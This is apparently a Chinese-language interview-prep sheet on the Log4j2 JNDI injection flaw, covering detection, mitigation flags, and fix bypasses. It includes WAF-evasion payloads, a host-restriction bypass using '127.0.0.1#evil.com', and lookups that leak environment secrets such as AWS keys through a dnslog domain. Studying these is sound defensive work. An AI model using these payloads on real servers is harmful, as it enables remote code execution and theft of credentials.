## Log4j2

### 谈谈Log4j2漏洞（★★）

漏洞原理其实不难，简单来说就是对于`${jndi:}`格式的日志默认执行`JndiLoop.lookup`导致的RCE。日志的任何一部分插入`${}`都会进行递归处理，也就是说`log.info/error/warn`等方法如果日志内容可控，就会导致这个问题。这个漏洞本身不复杂，后续的绕过比较有趣



### Log4j2漏洞的黑盒检测（★）

由于该漏洞的特性，必须要出网才可以检测，例如`dnslog`的方式

在内网中也可不使用`dnslog`而是自行实现伪`JDNI/LDAP`的服务端用于探测



### Log4j2漏洞的白盒检测（★）

检查`pom.xml`或`gradle`中的依赖，是否存在`log4j2-api`和`log4j2-core`小于`2.15.0`则存在漏洞



### Log4j2的紧急修复手段（★★）

在JVM参数中添加`-Dlog4j2.formatMsgNoLookups=true`

系统环境变量中将`LOG4J_FORMAT_MSG_NO_LOOKUPS`设置为`true`

创建`log4j2.component.properties`文件并增加配置`log4j2.formatMsgNoLookups=true`

不重启应用情况下的修复手段参考另一个问题



### 知道Log4j2 2.15.0 RC1修复的绕过吗（★★★）

修复内容限制了协议和HOST以及类型，其中类型这个东西其实没用，协议的限制中包含了`LDAP`等于没限制。重点在于HOST的限制，只允许本地localhost和127.0.0.1等IP。但这里出现的问题是，加入了限制但没有捕获异常，如果产生异常会继续`lookup`所以如果在URL中加入一些特殊字符，例如空格，即可导致异常绕过HOSOT限制，然后`lookup`触发RCE



### Log4j2的两个DOS CVE了解吗（★★）

其中一个DOS是`lookup`本身延迟等待和允许多个标签`${}`导致的问题

另一个DOS是嵌套标签`${}`递归解析导致栈溢出



### Log4j2 2.15.0正式版的绕过了解吗（★★★）

正式版的修复只是在之前基础上捕获了异常。这个绕过本质还是绕HOST限制。使用`127.0.0.1#evil.com`即可绕过，需要服务端配置泛域名，所以#前的127.0.0.1会被认为是某个子域名，而本地解析认为这是127.0.0.1绕过了HOST的限制。但该RCE仅可以在MAC OS和部分Linux平台成功



### Log4j2绕WAF的手段有哪些（★★）

使用类似`${::-J}`的方式做字符串的绕过，还可以结合`upper`和`lower`标签进行嵌套

有一些特殊字符的情况结合大小写转换有巧妙的效果，还可以加入垃圾字符

例如：`${jnd${upper:ı}:ldap://127.0.0.1:1389/Calc}`



### Log4j2除了RCE还有什么利用姿势（★★★）

利用其他的`lookup`可以做信息泄露例如`${env:USER}`和`${env:AWS_SECRET_ACCESS_KEY}`

在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息，不过`SpringBoot`默认不使用`log4j2`

这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`



### 不停止运行程序如何修复Log4j2漏洞（★★★）

利用JavaAgent改JVM中的字节码，可以直接删了`JndiLookup`的功能

有公众号提出类似`Shiro`改`Key`的思路，利用反射把`JndiLookup`删了也是一种办法